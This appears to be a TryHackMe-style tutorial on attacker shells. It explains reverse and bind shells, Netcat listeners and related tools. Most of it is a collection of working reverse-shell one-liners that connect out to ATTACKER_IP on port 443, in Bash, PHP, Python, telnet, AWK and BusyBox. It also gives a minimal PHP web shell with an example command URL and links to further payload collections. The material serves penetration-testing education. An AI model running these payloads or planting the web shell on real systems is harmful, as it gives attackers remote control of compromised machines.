What is a Shell?
A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.

In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

Remote System Control: allows the attacker to execute commands or software remotely in the target system.
Privilege Escalation: If initial access through a shell is limited or restricted, attackers can explore ways to escalate privileges to more elevated or administrative access.
Data Exfiltration: Once attackers have access to execute commands through an obtained shell, they can explore the system to read and copy sensitive data from it.
Persistence and Maintenance Access: Once shell access is obtained, attackers can create access through users and credentials or copy backdoor software to maintain access to the target system for later usage.
Post-Exploitation Activities: After access to a shell is granted, attackers can perform a wide range of post-exploitation activities, such as deploying malware, creating hidden accounts, and deleting information.
Access Other Systems on the Network: Depending on the attacker's intentions, the obtained shell can be just an initial access point. The goal can be to hop through the network to a different target using the obtained shell as a pivot to different points in the compromised system network. This is also known as pivoting.


Reverse Shell
A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command nc -lvnp 443.
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...

The command above uses the -l option to indicate Netcat to listen or wait for a connection. The -v option enables verbose mode. The -n option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address. Finally, the -p flag indicates the port that will be used to wait for the connection, in the case above, port 443.
Any port can be used to wait for a connection, but attackers and pentesters tend to use known ports used by other applications like 53, 80, 8080, 443, 139, or 445. This is to blend the reverse shell with legitimate traffic and avoid detection by security appliances.


Gaining Reverse Shell Access
Once we have our listener set, the attacker should execute what is known as a reverse shell payload. This payload usually abuses the vulnerability or unauthorized access granted by the attacker and executes a command that will expose the shell through the network. There's a variety of payloads that will depend on the tools and OS of the compromised system. We can explore some of them here.
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Once the above payload is executed, the attacker will receive a reverse shell, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

Attacker Terminal Output (Receiving Shell)

Terminal
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
The output above shows the connection coming from the IP 10.10.13.37, which is the IP address of the compromised target.

---

Bind Shell
As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.
This method can be used when the compromised target does not allow outgoing connections, but it tends to be less popular since it needs to remain active and listen for connections, which can lead to detection.

---

A utility like Netcat will handle the connection and allow the attacker to interact with the exposed shell, but Netcat is not the only utility that will allow us to do that.

Which flexible networking tool allows you to create a socket connection between two data sources?
socat

Which command-line utility provides readline-style editing and command history for programs that lack it, enhancing the interaction with a shell listener?
rlwrap

What is the improved version of Netcat distributed with the Nmap project that offers additional features like SSL support for listening to encrypted shells?
ncat

---

Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.



Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell.

Bash
Normal Bash Reverse Shell


Terminal
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (ATTACKER_IP) on port 443. The >& operator combines both standard output and standard error.


Bash Read Line Reverse Shell


Terminal
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
This reverse shell creates a new file descriptor (5 in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.


Bash With File Descriptor 196 Reverse Shell


Terminal
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
This reverse shell uses a file descriptor (196 in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.


Bash With File Descriptor 5 Reverse Shell


Terminal
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
Similar to the first example, this command opens a shell (bash -i), but it uses file descriptor 5 for input and output, enabling an interactive session over the TCP connection.

PHP
PHP Reverse Shell Using the exec Function


Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
This reverse shell creates a socket connection to the attacker's IP on port 443 and uses the exec function to execute a shell, redirecting standard input and output.


PHP Reverse Shell Using the shell_exec Function


Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
Similar to the previous command, but uses the shell_exec function.


PHP Reverse Shell Using the system Function


Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
This reverse shell employs the system function, which executes the command and outputs the result to the browser.


PHP Reverse Shell Using the passthru Function


Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
The passthru function executes a command and sends raw output back to the browser. This is useful when working with binary data.


PHP Reverse Shell Using the popen Function


Terminal
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
This reverse shell uses popen to open a process file pointer, allowing the shell to be executed.

Python
﻿Please note, the following snippets below require using python -c to run, indicated by the placeholder PY-C
Python Reverse Shell by Exporting Environment Variables


Terminal
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.

Python Reverse Shell Using the subprocess Module


Terminal
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.

Short Python Reverse Shell


Terminal
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
This reverse shell creates a socket (s), connects to the attacker, and redirects standard input, output, and error to the socket using os.dup2().

Others

Telnet


Terminal
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 

AWK


Terminal
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.

BusyBox


Terminal
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.

---

Web Shell

A web shell is a script written in a language supported by a compromised web server that executes commands through the web server itself. A web shell is usually a file containing the code that executes commands and handles files. It can be hidden within a compromised web application or service, making it difficult to detect and very popular among attackers.

Example PHP Web Shell
Let’s look at an example PHP web shell to understand how this process works:


<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

The above shell can be saved into a file with the PHP extension, like shell.php, and then uploaded into the web server by the attacker by exploiting vulnerabilities such as Unrestricted File Upload, File Inclusion, Command Injection, among others, or by gaining unauthorized access to it. 
After the web shell is deployed in the server, it can be accessed through the URL where the web shell is hosted, in this example http://victim.com/uploads/shell.php. As we observed from the code in shell.php, we need to provide a GET method and the value of the variable cmd, which should contain the command the attacker wants to execute. For example, if we want to execute the command whoami the request to the URL should be:
http://victim.com/uploads/shell.php?cmd=whoami
The above will execute the command whoami and display the result in the web browser.

Existing Web Shells Available Online
https://www.r57shell.net/index.php


